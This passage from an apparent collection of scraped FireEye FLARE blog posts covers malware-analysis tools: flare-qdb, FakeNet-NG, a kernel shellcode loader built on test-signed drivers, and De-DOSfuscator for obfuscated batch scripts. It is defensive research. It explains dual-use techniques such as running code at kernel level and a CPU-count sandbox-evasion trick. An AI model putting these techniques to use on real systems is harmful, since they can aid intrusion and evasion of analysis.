library functions in the output from injectfind above. The screenshot of IDA Pro in Figure 2 shows this same region of data. Note that following each ASCII string containing an API name, there is a number that looks like a pointer. Unfortunately, IDA Pro does not have the same insight as the debugger, so these addresses are not resolved to API functions and named. Figure 4: Unnamed library function addresses We use the importfind plug-in to find the function names associated with these addresses, as shown in Figure 5. Figure 5: importfind plug-in run in Windbg The importfind plug-in generates an IDA Python script file that is used to rename these global variables in our IDB as shown in Figure 2. Figure 6 shows a screenshot from IDA Pro after the script has renamed the global variables to more meaningful names. Figure 6: IDA Pro with named global variables Conclusion This blog post shows the power of using the flare-dbg plug-ins with a debugger to gain insight into how the malware operates at runtime. We saw how to identify injected code using the injectfind plug-in and create memory breakpoints using membreak . We also demonstrated the usefulness of the importfind plug-in for identifying and renaming runtime imported functions. To find out how to setup and get started with flare-dbg, head over the github project page where you’ll learn about setup and usage. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/09/flare-on_challenges.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-09-08",
                    "source": "www.fireeye.com"
                },
                "text": "It’s not an alien space ship, it’s a huge belt buckle for this year’s\nwinners (quarter for scale)! The challenge was a massive success, with\n162 winners from a total of 1408 active participants. We consider\nactive participants as those who solved one or more challenges. All\nthe stats presented here are as of 12:00pm Eastern Time, which is 8\nhours before the end of the contest. The first challenge binary was\ndownloaded by 4,850 people. The following graph depicts the number of\nfinishers of each of the 11 stages this year. The first few challenges narrowed the playing field drastically, with most serious contestants holding firm through challenges 4-9. The last two increased the difficulty level and proved a difficult final series of challenges for a well-earned finish line. The FLARE On Challenge always reaches a very wide international audience. Outside of the USA, this year’s country with the most finishers was China, with and impressive 11 winners. I hope that massive shipment of belt buckles doesn’t get caught up in customs! The performance of contestants from Vietnam and Slovakia were also particularly commendable, as both held early leads in total finishers. Based on the locations we are sending the challenge prizes to (people who responded with their shipping info by noon today) we can say that 33 countries had finishers this year. This next graphs shows the total winners by country this year. And without further ado, here are the solutions for this year’s challenges, each written by their respective challenge creator. 1. CLICK HERE FOR SOLUTION #1 2. CLICK HERE FOR SOLUTION #2 3. CLICK HERE FOR SOLUTION #3 4. CLICK HERE FOR SOLUTION #4 5. CLICK HERE FOR SOLUTION #5 6. CLICK HERE FOR SOLUTION #6 7. CLICK HERE FOR SOLUTION #7 8. CLICK HERE FOR SOLUTION #8 9. CLICK HERE FOR SOLUTION #9 10. CLICK HERE FOR SOLUTION #10 11. CLICK HERE FOR SOLUTION #11 We hope you had fun and learned something new about reverse engineering! Stay tuned for the third FLARE On Challenge coming in 2016! Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/01/flare_script_series.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2017-01-04",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction This post continues the FireEye Labs Advanced Reverse Engineering (FLARE) script series. Here, we introduce flare-qdb, a command-line utility and Python module based on vivisect for querying and altering dynamic binary state conveniently, iteratively, and at scale. flare-qdb works on Windows and Linux, and can be obtained from the flare-qdb github project . Motivation Efficiently understanding complex or obfuscated malware frequently entails debugging. Often, the linear process of following the program counter raises questions about parallel or previous register states, state changes within a loop, or if an instruction will ever be executed at all. For example, a register’s value may not become interesting until the analyst learns it was an important input to a function that has already been executed. Restarting a debug session and cataloging the results can take the analyst out of the original thought process from which the question arose. A malware analyst must constantly judge whether such inquiries will lend indispensable observations or extraneous distractions. The wrong decision wastes precious time. It would be useful to query malware state like a database, similar to the following: SELECT eax, poi(ebp-0x14) FROM malware.exe WHERE eip = 0x401072 FLARE has devised a command-line tool to efficiently query dynamic state and more in a similar fashion. The following is a description of this tool with examples of how it has been used within FLARE to analyze malware, simulate new scenarios, and even solve challenges from the 2016 FLARE-On challenge. Usage Drawing heavily from vivisect , flare-qdb is an open source tool for efficiently posing sophisticated questions and obtaining simple answers from binaries. flare-qdb’s command-line syntax is as follows: flareqdb \"<cmdline>\" -at <address> \"<python>\" flare-qdb allows an analyst to execute a command line of their choosing, break on arbitrary program counter values, optionally check conditions, and display or alter program state with ad-hoc Python code. flare-qdb implements several WinDbg-like builtins for querying and modifying state. Table 1 lists a few illustrative example queries. Experiment or Alteration Query What two DWORD arguments are passed to kernel32!Beep? (WinDbg analog: dd) -at kernel32.Beep \"dd('esp+4', 2)\" Terminate if eax is null at 0x401072 (WinDbg analog: .kill) -at-if 0x401072 eax==0 \"kill()\" Alter ecx programmatically (WinDbg analog: r) -at malwaremodule+0x102a \"r('ecx', '(ebp-0x14)*eax') Alter memory programmatically -at 0x401003 \"memset('ebp-0x14', 0x2a, 4)\" Table 1: Example flare-qdb queries Using the flareqdb Command Line The usefulness of flare-qdb can be seen in cases such as loops dealing with strings. Figure 1 shows the flareqdb command line utility being used to dump the Unicode string pointed to by a stack variable for each iteration of a loop. The output reveals that the variable is used as a runner pointer iterating through argv[1]. Figure 1: Using flareqdb to monitor a string within a loop Another example is challenge 4 from the 2016 FLARE-On Challenge (spoiler alert: partial solution presented below, full walkthrough is here ). In flareon2016challenge.dll, a decoded PE file contains a series of calls to kernel32!Beep that must be tracked in order to construct the correct sequence of calls to ordinal #50 in the challenge binary. Figure 2 shows a flareqdb one-liner that forwards each kernel32!Beep call to ordinal #50 in the challenge binary to obtain the flag. Figure 2: Using flareqdb to solve challenge 4 of the 2016 FLARE-On Challenge flareqdb can also force branches to be taken, evaluate function pointer values, and validate suspected function addresses by disassembling. For example, consider the subroutine in Figure 3, which is only invoked if a set of conditions is satisfied and which calls a C++ virtual function. Identifying this function could help the analyst identify its caller and discover what kind of data to provide through the command and control (C2) channel to exercise it. Figure 3: Unidentified function with virtual function call Using the flareqdb command-line utility, it is possible to divert the program counter to bypass checks on the C2 data that was provided and subsequently dump the address of the function pointer that is called by the malware at program counter 0x4029a4. Thanks to vivisect, flare-qdb can even disassemble the instructions at the resulting address to validate that it is indeed a function. Figure 4 shows the flareqdb command-line utility being used to force control flow at 0x4016b5 to proceed to 0x4016bb (not shown) and later to dump the function pointer called at 0x4029a4. Figure 4: Forcing a branch and resolving a C++ virtual function call The function pointer resolves to 0x402f32, which IDA has already labeled as basic_streambuf::xsputn as shown in Figure 5. This function inserts a series of characters into a file stream, which suggests a file write capability that might be exercised by providing a filename and/or file data via the C2 channel. Figure 5: Resolved virtual function address Using the flareqdb Python Module flare-qdb also exists as a Python module that is useful for more complex cases. flare-qdb allows for ready use of the powerful vivisect library. Consider the logic in Figure 6, which is part of a privilege escalation tool. The tool checks GetVersionExW, NetWkstaGetInfo, and IsWow64Process before exploiting CVE-2016-0040 in WMI. Figure 6: Privilege escalation platform check It appears as if the tool exploits 32-bit Windows installations with version numbers 5.1+, 6.0, and 6.1. Figure 7 shows a script to quickly validate this by executing the tool 12 times, simulating different versions returned from GetVersionExW and NetWkstaInfo. Each time the script executes the malware, it indicates whether the malware reached the point of attempting the privilege escalation or not. The script passes a dictionary of local variables to the Qdb instance for each execution in order to permit the user callback to print the friendly name of each Windows version it is simulating for the binary. The results of GetVersionExW are modified prior to return using the vstruct definition of the OSVERSIONINFOEXW; NetWkstaGetInfo is fixed manually for brevity and in the absence of a definition corresponding to the WKSTA_INFO_100 structure. Figure 7: Script to test version check Figure 8 shows the output, which confirms the analysis of the logic from Figure 6. Figure 8: Script output Next, consider an example in which the analyst must devise a repeatable process to unpack a binary and ascertain the locations of unpacked PE-COFF files injected throughout memory. The script in Figure 9 does this by setting a breakpoint relative to the tail call and using vivisect’s envi module to enumerate all the RWX memory locations that are not backed by a named file. It then uses flare-qdb’s park() builtin before calling detach() so that the binary runs in an endless loop, allowing the analyst to attach a debugger and resume manual analysis. Figure 9: Unpacker script that parks its debuggee after unpacking is complete Figure 10 shows the script announcing the locations of the self-injected modules before parking the process in an infinite loop and detaching. Figure 10: Result of unpacker script Attaching with IDA Pro via WinDbg as in Figure 11 shows that the program counter points to the infinite loop written in memory allocated by flare-qdb. The park() builtin stored the original program counter value in the bytes following the jmp instruction. The analyst can return the program to its original location by referring to those bytes and entering the WinDbg command r eip=1DC129B. Figure 11: Attaching to the parked process The parked process makes it convenient to snapshot the malware execution VM and repeatedly connect remotely to exercise and annotate different code areas with IDA Pro as the debugger. Because the same OS process can be reused for multiple debug sessions, the memory map announced by the script remains the same across debugging sessions. This means that the annotations created in IDA Pro remain relevant instead of becoming disconnected from the varying data and code locations that would result from the non-deterministic heap addresses returned by VirtualAlloc if the program were simply executed multiple times. Conclusion flare-qdb provides a command-line tool to quickly query dynamic binary state without derailing the thought process of an ongoing debugging session. In addition to querying state, flare-qdb can be used to alter program state and simulate new scenarios. For intricate cases, flare-qdb has a scripting interface permitting almost arbitrary manipulation. This can be useful for string decoding, malware unpacking, and general software analysis. Head over to the flare-qdb github page to get started using it. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/07/linux-support-for-fakenet-ng.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2017-07-05",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction In 2016, FLARE introduced FakeNet-NG , an open-source network analysis tool written in Python. FakeNet-NG allows security analysts to observe and interact with network applications using standard or custom protocols on a single Windows host, which is especially useful for malware analysis and reverse engineering. Since FakeNet-NG’s release, FLARE has added support for additional protocols. FakeNet-NG now has out-of-the-box support for DNS, HTTP (including BITS), FTP, TFTP, IRC, SMTP, POP, TCP, and UDP as well as SSL. Building on this work, FLARE has now brought FakeNet-NG to Linux. This allows analysts to perform basic dynamic analysis either on a single Linux host or using a separate, dedicated machine in the same way as INetSim. INetSim has made amazing contributions to the productivity of the security community and is still the tool of choice for many analysts. Now, FakeNet-NG gives analysts a cross-platform tool for malware analysis that can directly integrate with all the great Python-based infosec tools that continually emerge in the field. Getting and Installing FakeNet-NG on Linux If you are running REMnux , then good news: REMnux now comes with FakeNet-NG installed, and existing users can get it by running the update-remnux command. For other Linux distributions, setting up and using FakeNet-NG will require the Python pip package manager, the net-tools package, and the development files for OpenSSL, libffi , and libnetfilterqueue . Here is how to quickly obtain the appropriate prerequisites for a few common Linux distributions: Debian and Ubuntu: sudo apt-get install python-pip python-dev libssl-dev libffi-dev libnetfilter-queue-dev net-tools Fedora 25 and CentOS 7: yum -y update; yum -y install epel-release; # <-- If CentOS yum -y install redhat-rpm-config; # <-- If Fedora yum -y groupinstall 'Development Tools'; yum -y install python-pip python-devel openssl-devel libffi-devel libnetfilter_queue-devel net-tools Once you have the prerequisites, you can download the latest version of FakeNet-NG and install it using setup.py install . A Tale of Two Modes On Linux, FakeNet-NG can be deployed in MultiHost mode on a separate host dedicated to network simulation, or in the experimental SingleHost mode for analyzing software locally. Windows only supports SingleHost mode. FakeNet-NG is configured by default to run in NetworkMode: Auto , which will automatically select SingleHost mode on Windows or MultiHost mode on Linux. Table 1 lists the currently supported NetworkMode settings by operating system. SingleHost MultiHost Windows Default (Auto) Unsupported Linux Experimental Default (Auto) Table 1: FakeNet-NG NetworkMode support per platform FakeNet-NG’s support for SingleHost mode on Linux currently has limitations. First, FakeNet-NG does not yet support conditional redirection of specific processes, hosts, or ports on Linux. This means that settings like ProcessWhiteList will not work as expected. We plan to add support for these settings in a later release. In the meantime, SingleHost mode supports redirecting all Internet-bound traffic to local listeners, which is the main use case for malware analysts. Second, the python-netfilterqueue library is hard-coded to handle datagrams of no more than 4,012 octets in length. Loopback interfaces are commonly configured with high maximum transmittal unit (MTU) settings that allow certain applications to exceed this hard-coded limit, resulting in unanticipated network behavior. An example of a network application that may exhibit issues due to this would be a large file transfer via FTP. A workaround is to recompile python-netfilterqueue with a larger buffer size or to decrease the MTU for the loopback interface (i.e. lo) to 4,012 or less. Configuring FakeNet-NG on Linux In addition to the new NetworkMode setting, Linux support for FakeNet-NG introduces the following Linux-specific configuration items: LinuxRedirectNonlocal : For MultiHost mode, this setting specifies a comma-delimited list of network interfaces for which to redirect all traffic to the local host so that FakeNet-NG can reply to it. The setting in FakeNet-NG’s default configuration is *, which configures FakeNet-NG to redirect on all interfaces. LinuxFlushIptables : Deletes all iptables rules before adding rules for FakeNet-NG. The original rules are restored as part of FakeNet-NG’s shutdown sequence which is triggered when you hit Ctrl+C. This reduces the likelihood of conflicting, erroneous, or duplicate rules in the event of unexpected termination, and is enabled in FakeNet-NG’s default configuration. LinuxFlushDnsCommand : Specifies the command to flush the DNS resolver cache. When using FakeNet-NG in SingleHost mode on Linux, this ensures that name resolution requests are forwarded to a DNS service such as the FakeNet-NG DNS listener instead of using cached answers. The setting is not applicable on all distributions of Linux, but is populated by default with the correct command for Ubuntu Linux. Refer to your distribution’s documentation for the proper command for this behavior. Starting FakeNet-NG on Linux Before using FakeNet-NG, also be sure to disable any services that may bind to ports corresponding to the FakeNet-NG listeners you plan to use. An example is Ubuntu’s use of a local dnsmasq service. You can use netstat to find such services and should refer to your Linux distribution’s documentation to determine how to disable them. You can start FakeNet-NG by invoking fakenet with root privileges, as shown in Figure 1. Figure 1: Starting FakeNet-NG on Linux You can alter FakeNet-NG’s configuration by either directly editing the file displayed in the first line of FakeNet-NG’s output, or by creating a copy and specifying its location with the -c command-line option. Conclusion FakeNet-NG now brings the convenience of a modern, Python-based, malware-oriented network simulation tool to Linux, supporting the full complement of listeners that are available on FakeNet-NG for Windows. Users of REMnux can make use of FakeNet-NG already, while users of other Linux distributions can download and install it using standard package management tools. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/04/loading-kernel-shellcode.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-04-23",
                    "source": "www.fireeye.com"
                },
                "text": "In the wake of recent hacking tool dumps, the FLARE team saw a spike in malware samples detonating kernel shellcode. Although most samples can be analyzed statically, the FLARE team sometimes debugs these samples to confirm specific functionality. Debugging can be an efficient way to get around packing or obfuscation and quickly identify the structures, system routines, and processes that a kernel shellcode sample is accessing. This post begins a series centered on kernel software analysis, and introduces a tool that uses a custom Windows kernel driver to load and execute Windows kernel shellcode. I’ll walk through a brief case study of some kernel shellcode, how to load shellcode with FLARE’s kernel shellcode loader , how to build your own copy, and how it works. As always, only analyze malware in a safe environment such as a VM; never use tools such as a kernel shellcode loader on any system that you rely on to get your work done. A Tale of Square Pegs and Round Holes Depending upon how a shellcode sample is encountered, the analyst may not know whether it is meant to target user space or kernel space. A common triage step is to load the sample in a shellcode loader and debug it in user space. With kernel shellcode, this can have unexpected results such as the access violation in Figure 1. Figure 1: Access violation from shellcode dereferencing null pointer The kernel environment is a world apart from user mode: various registers take on different meanings and point to totally different structures. For instance, while the gs segment register in 64-bit Windows user mode points to the Thread Information Block (TIB) whose size is only 0x38 bytes, in kernel mode it points to the Processor Control Region (KPCR) which is much larger. In Figure 1 at address 0x2e07d9, the shellcode is attempting to access the IdtBase member of the KPCR, but because it is running in user mode, the value at offset 0x38 from the gs segment is null. This causes the next instruction to attempt to access invalid memory in the NULL page. What the code is trying to do doesn’t make sense in the user mode environment, and it has crashed as a result. In contrast, kernel mode is a perfect fit. Figure 2 shows WinDbg’s dt command being used to display the _KPCR type defined within ntoskrnl.pdb, highlighting the field at offset 0x38 named IdtBase. Figure 2: KPCR structure Given the rest of the code in this sample, accessing the IdtBase field of the KPCR made perfect sense. Determining that this was kernel shellcode allowed me to quickly resolve the rest of my questions, but to confirm my findings, I wrote a kernel shellcode loader. Here’s what it looks like to use this tool to load a small, do-nothing piece of shellcode. Using FLARE’s Kernel Shellcode Loader I booted a target system with a kernel debugger and opened an administrative command prompt in the directory where I copied the shellcode loader (kscldr.exe). The shellcode loader expects to receive the name of the file on disk where the shellcode is located as its only argument. Figure 3 shows an example where I’ve used a hex editor to write the opcodes for the NOP (0x90) and RET (0xC3) instructions into a binary file and invoked kscldr.exe to pass that code to the kernel shellcode loader driver. I created my file using the Windows port of xxd that comes with Vim for Windows . Figure 3: Using kscldr.exe to load kernel shellcode The shellcode loader prompts with a security warning. After clicking yes, kscldr.exe installs its driver and uses it to execute the shellcode. The system is frozen at this point because the kernel driver has already issued its breakpoint and the kernel debugger is awaiting commands. Figure 4 shows WinDbg hitting the breakpoint and displaying the corresponding source code for kscldr.sys. Figure 4: Breaking in kscldr.sys From the breakpoint, I use WinDbg with source-level debugging to step and trace into the shellcode buffer. Figure 5 shows WinDbg’s disassembly of the buffer after doing this. Figure 5: Tracing into and disassembling the shellcode The disassembly shows the 0x90 and 0xc3 opcodes from before, demonstrating that the shellcode buffer is indeed being executed. From here, the powerful facilities of WinDbg are available to debug and analyze the code’s behavior. Building It Yourself To try out FLARE’s kernel shellcode loader for yourself, you’ll need to download the source code . To get started building it, download and install the Windows Driver Kit (WDK) . I’m using Windows Driver Kit Version 7.1.0 , which is command line driven, whereas more modern versions of the WDK integrate with Visual Studio. If you feel comfortable using a newer kit, you’re welcomed to do so, but beware, you’ll have to take matters into your own hands regarding build commands and dependencies. Since WDK 7.1.0 is adequate for purposes of this tool, that is the version I will describe in this post. Once you have downloaded and installed the WDK, browse to the Windows Driver Kits directory in the start menu on your development system and select the appropriate environment. Figure 6 shows the WDK program group on a Windows 7 system. The term “checked build” indicates that debugging checks will be included. I plan to load 64-bit kernel shellcode, and I like having Windows catch my mistakes early, so I’m using the x64 Checked Build Environment. Figure 6: Windows Driver Kits program group In the WDK command prompt, change to the directory where you downloaded the FLARE kernel shellcode loader and type ez.cmd. The script will cause prompts to appear asking you to supply and use a password for a test signing certificate. Once the build completes, visit the bin directory and copy kscldr.exe to your debug target. Before you can commence using your custom copy of this tool, you’ll need to follow just a few more steps to prepare the target system to allow it. Preparing the Debug Target To debug kernel shellcode, I wrote a Windows software-only driver that loads and runs shellcode at privilege level 0. Normally, Windows only loads drivers that are signed with a special cross-certificate , but Windows allows you to enable testsigning to load drivers signed with a test certificate. We can create this test certificate for free, and it won’t allow the driver to be loaded on production systems, which is ideal. In addition to enabling testsigning mode, it is necessary to enable kernel debugging to be able to really follow what is happening after the kernel shellcode gains execution. Starting with Windows Vista, we can enable both testsigning and kernel debugging by issuing the following two commands in an administrative command prompt followed by a reboot: bcdedit.exe /set testsigning on bcdedit.exe /set debug on For debugging in a VM, I install VirtualKD , but you can also follow your virtualization vendor’s directions for connecting a serial port to a named pipe or other mechanism that WinDbg understands. Once that is set up and tested, we’re ready to go! If you try the shellcode loader and get a blue screen indicating stop code 0x3B (SYSTEM_SERVICE_EXCEPTION), then you likely did not successfully connect the kernel debugger beforehand. Remember that the driver issues a software interrupt to give control to the debugger immediately before executing the shellcode; if the debugger is not successfully attached, Windows will blue screen. If this was the case, reboot and try again, this time first confirming that the debugger is in control by clicking D ebug -> B reak in WinDbg. Once you know you have control, you can issue the g command to let execution continue (you may need to disable driver load notifications to get it to finish the boot process without further intervention: sxd ld). How It Works The user-space application (kscldr.exe) copies the driver from a PE-COFF resource to the disk and registers it as a Windows kernel service. The driver implements device write and I/O control routines to allow interaction from the user application. Its driver entry point first registers dispatch routines to handle CreateFile, WriteFile, DeviceIoControl, and CloseHandle. It then creates a device named \\Device\\kscldr and a symbolic link making the device name accessible from user-space. When the user application opens the device file and invokes WriteFile, the driver calls ExAllocatePoolWithTag specifying a PoolType of NonPagedPool ( which is executable ), and writes the buffer to the newly allocated memory. After the write operation, the user application can call DeviceIoControl to call into the shellcode. In response, the driver sets the appropriate flags on the device object, issues a breakpoint to pass control to the kernel debugger, and finally calls the shellcode as if it were a function. While You’re Here Driver development opens the door to unique instrumentation opportunities. For example, Figure 7 shows a few kernel callback routines described in the WDK help files that can track system-wide process, thread, and DLL activity. Figure 7: WDK kernel-mode driver architecture reference Kernel development is a deep subject that entails a great deal of study, but the WDK also comes with dozens upon dozens of sample drivers that illustrate correct Windows kernel programming techniques. This is a treasure trove of Windows internals information, security research topics, and instrumentation possibilities. If you have time, take a look around before you get back to work. Wrap-Up We’ve shared FLARE’s tool for loading privileged shellcode in test environments so that we can dynamically analyze kernel shellcode. We hope this provides a straightforward way to quickly triage kernel shellcode if it ever appears in your environment. Download the source code now. Do you want to learn more about these tools and techniques from FLARE? Then you should take one of our Black Hat classes in Las Vegas this summer! Our offerings include Malware Analysis Crash Course , macOS Malware for Reverse Engineers , and Malware Analysis Master Class . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/11/cmd-and-conquer-de-dosfuscation-with-flare-qdb.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-11-20",
                    "source": "www.fireeye.com"
                },
                "text": "When Daniel Bohannon released his excellent DOSfuscation paper, I was fascinated to see how tricks I used as a systems engineer could help attackers evade detection. I didn’t have much to contribute to this conversation until I had to analyze a hideously obfuscated batch file as part of my job on the FLARE malware queue. Previously, I released flare-qdb , which is a command-line and Python-scriptable debugger based on Vivisect. I previously wrote about how to use flare-qdb to instrument and modify malware behavior. Flare-qdb also made a guest appearance in Austin Baker and Jacob Christie’s SANS DFIR Summit 2017 briefing , inducing the Windows event log service to exclude process creation events. In this blog post, I will show how I used flare-qdb to bring “script block logging” to the Windows command interpreter. I will also share an Easter Egg that I found by flipping only a single bit in the process address space of cmd.exe. Finally, I will share the script that I added to flare-qdb so you can de-obfuscate malicious command scripts yourself by executing them (in a safe environment, of course). But first, I’ll talk about the analysis that led me to this solution. At First Glance Figure 1 shows a batch script (MD5 hash 6C8129086ECB5CF2874DA7E0C855F2F6) that has been obfuscated using the BatchEncryption tool referenced in Daniel Bohannon’s paper. This file does not appear in VirusTotal as of this writing, but its dropper does (the MD5 hash is ABD0A49FDA67547639EEACED7955A01A). My goal was to de-obfuscate this script and report on what the attacker was doing. Figure 1: Contents of XYNT.bat This 165k batch file is dropped as C:\\Windows\\Temp\\XYNT.bat and executed by its dropper. Its commands are built from environment variable substrings. Figure 2 shows how to use the ECHO command to decode the first command. Figure 2: Partial command decoding via the ECHO command The script uses hundreds of commands to set environment variables that are ultimately expanded to de-obfuscate malicious commands. A tedious approach to de-obfuscating this script would be to de-fang each command by prepending an ECHO statement to print each de-obfuscated command to the console. Unfortunately, although the ECHO command can “decode” each command, BatchEncryption needs the SET commands to be executed to decode future commands. To decode this script while allowing the full malicious functionality to run as expected, you would have to iteratively and carefully echo and selectively execute a few hundred obfuscated SET commands. The irony of BatchEncryption is that batch scripts are viewed as being easy to de-obfuscate, making binary code the safer place to hide logic from the prying eyes of network defenders. But BatchEncryption adds a formidable barrier to analysis by its extensive, layered use of environment variables to rebuild the original commands. Taking Cmd of the Situation I decided to see if it would be easier to instrument cmd.exe to log commands rather than de-obfuscating the script myself. To begin, I debugged cmd.exe, set a breakpoint on CreateProcessW, and executed a program from the command prompt. Figure 3 shows the call stack for CreateProcessW as cmd.exe executes notepad. Figure 3: Call stack for CreateProcessW in cmd.exe Starting from cmd!ExecPgm, I reviewed the disassembly of the above functions in cmd.exe to trace the origin of the command string up the call stack. I discovered cmd!Dispatch, which receives not a string but a structure with pointers to the command, arguments, and any I/O redirection information (such as redirecting the standard output or error streams of a program to a file or device). Testing revealed that these strings had all their environment variables expanded, which means we should be able to read the de-obfuscated commands from here. Figure 4 is an exploration of this structure in WinDbg after running the command \"echo hai > nul\". This command prints the word hai to the standard output stream but uses the right-angle bracket to redirect standard output to the NUL device, which discards all data. The orange boxes highlight non-null pointers that got my attention during analysis, and the arrows point to the commands I used to discover their contents. Figure 4: Exploring the interesting pointers in 2nd argument to cmd!Dispatch Because users can redirect multiple I/O streams in a single command, cmd.exe represents I/O redirection with a linked list. For example, the command in Listing 1 shows redirection of standard output (stream #1 is implicit) to shares.txt and standard error (stream #2 is explicitly referenced) to errors.txt. net use > shares.txt 2>errors.txt Listing 1: Command-line I/O redirection example Figure 5 shows the command data structure and the I/O redirection linked list in block diagram format. Figure 5: Command data structure diagram By inspection, I found that cmd!Dispatch is responsible for executing both shell built-ins and executable programs, so unlike breaking on CreateProcess, it will not miss commands that do not result in process creation. Based on these findings, I wrote a flare-qdb script to parse and dump commands as they are executed. Introducing De-DOSfuscator De-DOSfuscator uses flare-qdb and Vivisect to hook the Dispatch function in cmd.exe and parse commands from memory. The De-DOSfuscator script runs in a 64-bit Python 2 interpreter and dumps commands to both the console and a log file. The script comes with the latest version of flare-qdb and is installed as a Python entry point named dedosfuscator.exe. De-DOSfuscator relies on the location of the non-exported Dispatch function to log commands, and its location varies per system. For convenience, if an Internet connection is available, De-DOSfuscator automatically retrieves this function’s offset using Microsoft’s symbol server. To allow offline use, you can supply the path to a copy of cmd.exe from your offline machine to the --getoff switch to obtain this offset. You can then supply that output as the argument to the --useoff switch in your offline machine to inform De-DOSfuscator where the function is located. Alternately, you can use De-DOSfuscator with a downloaded PDB or a local symbol cache containing the correct symbols. Figure 6 demonstrates getting and using the offset in a single session. Note that for this to work in an isolated VM, you would instead specify the path to a copy of the guest’s command interpreter specific to that VM. Figure 6: Getting and using offsets and testing De-DOSfuscator This works great on the BatchEncrypted script in Figure 1. Let’s have a look. Results Figure 7 shows the log created by De-DOSfuscator after running XYNT.bat. Hundreds of lines of SET statements progressively build environment variables for composing further commands. Keen eyes will also note a misspelling of the endlocal command-line extension keyword. Figure 7: Beginning of dumped commands These environment variable manipulations give way to real commands as shown in Figure 8. One of the script’s first actions is to use reg.exe to check the NUMBER_OF_PROCESSORS environment variable. This analysis system only had one vCPU, which can be seen in the set \"a=1\" output on line 620. After this, the script executes goto del, which branches to a batch label that ultimately deletes the script and other dropped files. Figure 8: Anti-sandbox measure This is a batch-oriented spin on a common sandbox evasion trick. It works because many malware analysis sandboxes run with a single CPU to minimize hypervisor resources, whereas most modern systems have at least two CPU cores. Now that we can easily read the script’s commands, it is trivial to circumvent this evasion by, for example, increasing the number of vCPUs available to the VM. Figure 9 shows De-DOSfuscator log after inducing the rest of the code to run. Figure 9: After circumventing anti-sandbox measure XYNT.bat calls a dropped binary to create and start a Windows service for persistence. The largest dropped binary is a variant of the XMRig cryptocurrency miner, and many of the services and executables referenced by the script also appear to be cryptocurrency-related. Happy Easter Easter is a long way off, but I must present you with a very early Easter Egg because it is such a neat little find. During my journey through cmd.exe, I noticed a variable named fDumpParse having only one cross-reference that seemed to control an interesting behavior. The lone cross-reference and the relevant code are shown in Figure 10. Although fDumpParse is inaccessible anywhere else in the code, it controls whether a function is called to dump information about the command that has been parsed. Figure 10: fDumpParse evaluation and cross-refs (EDI is NULL) To experiment with this, you can use De-DOSfuscator’s --fDumpParse switch. You will then be greeted with a command prompt that is more transparent about what it has parsed. Figure 11 shows an example along with a graphical representation of the abstract syntax tree (AST) of parsed command tokens. Figure 11: Command interpreter with fDumpParse set Microsoft probably inserted the fDumpParse flag so developers could debug issues with cmd.exe. Unfortunately, as nifty as this is, it has drawbacks for bulk de-obfuscation: This output is harder to read than plain commands, because it dumps the tree in preorder traversal rather than inorder like it was typed. Output copied from the console may contain extraneous line breaks depending on the console host program’s text wrapping behavior. Scrolling in the command interpreter to read or copy output can be tedious. The console buffer is limited, so not everything may be captured. Malicious script authors can still use the CLS command to clear the screen and make all the fDumpParse output disappear. Gratuitous joining of commands with command separators (as found in XYNT.bat) yields unreadable ASTs that exceed the console width and wrap around, as in Figure 12. Figure 12: fDumpParse result exceeding console width Consequently, fDumpParse is not ideal for de-obfuscating large, malicious batch files; however, it is still interesting and useful for de-obfuscating short scripts or one-off commands. You can get the offset De-DOSfuscator needs for offline use via --getoff and use it via --useoff, as with normal operation. Wrapping Up I have given you an example of a heavily obfuscated command script and I have shared a useful tool for de-obfuscating it, along with the analytical steps that I followed to synthesize it. The De-DOSfuscator script code comes with the latest version of flare-qdb and is accessible as a script entry point (dedosfuscator.exe) when you install flare-qdb. It is my hope that this not only helps you to conveniently analyze malicious batch scripts, but also inspires you to devise your own creative ways to employ flare-qdb against malware. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/10/fakenet-content-based-protocol-detection.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2017-10-23",
                    "source": "www.fireeye.com"
                },
                "text": "I (Matthew Haigh) recently contributed to FLARE’s FakeNet-NG network simulator by adding content-based protocol detection and configuration. This feature is useful for analyzing malware that uses a protocol over a non-standard port; for example, HTTP over port 81. The new feature also detects and adapts to SSL so that any protocol can be used with SSL and handled appropriately by FakeNet-NG. We were motivated to add this feature since it was a feature of the original FakeNet and it was needed for real world malware. What is FakeNet-NG FakeNet-NG simulates a network so malware analysts can run samples with network functionality without the risks of an Internet connection. Analysts can examine network-based indicators via FakeNet-NG’s textual and pcap output. It is plug-and-play, configurable, and works on both Windows and Linux. FakeNet-NG simulates common protocols to trick malware into thinking it is connected to the Internet. FakeNet-NG supports the following protocols: DNS, HTTP, FTP, POP, SMTP, IRC, SSL, and TFTP. Previous Design Previously FakeNet-NG employed Listener modules, which were bound to configurable ports for each protocol. Any traffic on those ports was received by the socket and processed by the Listener. In the previous architecture, packets were redirected using a Diverter module that utilized WinDivert for Windows and netfilter for Linux. Each incoming and outgoing packet was examined by the Diverter, which kept a running list of connections. Packets destined for outbound ports were redirected to a default Listener, which would respond to any packet with an echo of the same data. The Diverter also redirected packets based on whether FakeNet-NG was run in Single-Host or Multi-Host mode, and if any applications were blacklisted or whitelisted according to the configuration. It would simply release the packet on the appropriate port and the intended Listener would receive it on the socket. New Design My challenge was to eliminate this port/protocol dependency. In order to disassociate the Listeners from the corresponding ports, a new architecture was needed. The first challenge was to maintain Listener functionality. The original architecture relied on Python libraries that interact with the socket. Therefore, we needed to maintain “socket autonomy” in the Listener, so we added a “taste()” function for each Listener. The routine returns a confidence score based on the likelihood that the 